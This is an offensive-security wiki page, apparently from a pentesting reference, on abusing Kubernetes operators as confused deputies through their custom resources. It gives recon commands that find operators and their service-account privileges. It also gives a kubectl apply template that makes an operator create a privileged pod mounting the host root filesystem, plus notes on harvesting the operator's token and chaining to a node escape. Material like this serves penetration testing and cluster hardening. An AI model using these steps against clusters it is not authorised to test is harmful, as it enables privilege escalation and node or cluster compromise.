---
title: "Operator and CRD abuse: driving a privileged controller through its resources"
description: "An operator watches custom resources and reconciles them into workloads, running with a service account broad enough to manage whatever it provisions. An attacker who can create or edit the operator's custom resources steers it to create privileged pods, mount host paths, or grant access, so the operator performs the action with its own elevated rights on the attacker's behalf."
keywords:
  - operator
  - custom resource
  - crd
  - reconcile
  - confused deputy
---

# Operator and CRD abuse

An operator is a controller that watches a custom resource definition and reconciles instances of it into real cluster objects: a database operator turns a `PostgresCluster` resource into StatefulSets, services, and secrets. To do that, the operator's service account must be able to create those objects, so it is broadly privileged. This makes the operator a confused deputy. An attacker who can create or edit the custom resources it watches, which often needs only rights on that CRD and not on the underlying objects, steers the operator into creating what the attacker specifies, performed with the operator's elevated permissions.

Find operators and the resources they act on:

```bash
kubectl get crd                                        # custom resource types
kubectl get pods -A | grep -iE 'operator|controller'
# what can the operator's service account do? (the privilege you borrow)
kubectl get clusterrolebindings -o json | python3 -c '
import sys,json
for b in json.load(sys.stdin)["items"]:
    for s in b.get("subjects") or []:
        if s.get("kind")=="ServiceAccount" and "operator" in s.get("name",""):
            print(b["roleRef"]["name"], s["namespace"]+"/"+s["name"])'
# can you create/edit the custom resources it reconciles?
kubectl auth can-i create <crd-plural>.<crd-group>
```

## Steer the operator

```bash
# submit a custom resource whose spec the operator renders into a privileged
# workload or an over-broad grant. The exact fields are operator-specific;
# look for spec options that map to pod security, volumes, or extra RBAC:
kubectl apply -f - <<'YAML'
apiVersion: <crd-group>/v1
kind: <CustomKind>
metadata: { name: x, namespace: <ns> }
spec:
  # fields the operator passes through to a pod spec it creates, e.g.
  podTemplate:
    securityContext: { privileged: true }
    volumes: [{ name: h, hostPath: { path: / } }]
YAML
# the operator reconciles this into a privileged, host-mounting pod it creates
```

## Exploitation notes

- The privilege you gain is the operator's, not yours: creating a custom resource may need only rights on that CRD, yet the operator then creates privileged pods or secrets you could not create directly, which is the escalation.
- Look for operator spec fields that pass through to pod security contexts, volumes, images, or that generate RBAC; those are the levers that turn a benign-looking custom resource into a node or cluster compromise.
- Some operators run their reconciled workloads with the operator's own powerful service account mounted, so a pod you steer it into creating may itself carry a strong token; check what the created pod's service account can do.
- This is the Kubernetes form of a confused-deputy escalation; it chains into [Pod escape to node](../pod-escape-to-node/index.md) when the steered pod is privileged.

## References

- [Kubernetes: custom resources and operators](https://kubernetes.io/docs/concepts/extend-kubernetes/operator/)
- [Operator Framework](https://operatorframework.io/)
- [HackTricks: Kubernetes operators](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
